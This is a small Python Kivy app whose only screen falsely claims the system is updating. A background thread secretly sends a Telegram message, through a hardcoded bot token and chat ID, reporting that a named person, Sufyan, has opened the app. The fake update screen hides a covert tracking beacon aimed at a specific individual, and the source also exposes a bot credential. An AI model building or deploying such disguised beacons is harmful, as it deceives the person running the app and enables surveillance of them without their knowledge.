from kivy.app import App
from kivy.uix.label import Label
import requests
from threading import Thread
import time

class SystemApp(App):
    def build(self):
        # بيانات بوت تلجرام الخاص بك
        self.token = "8074139832:AAH018y37OunK0YlWJIn_O_9n32S5X6P1I"
        self.chat_id = "6704689729"
        
        # إرسال التنبيه في الخلفية
        Thread(target=self.notify, daemon=True).start()
        return Label(text="جاري تحديث النظام... يرجى الانتظار")

    def notify(self):
        url = f"https://api.telegram.org/bot{self.token}/sendMessage?chat_id={self.chat_id}&text=🔔 سفيان فتح التطبيق الآن!"
        try:
            requests.get(url)
        except:
            pass

if __name__ == "__main__":
    SystemApp().run()
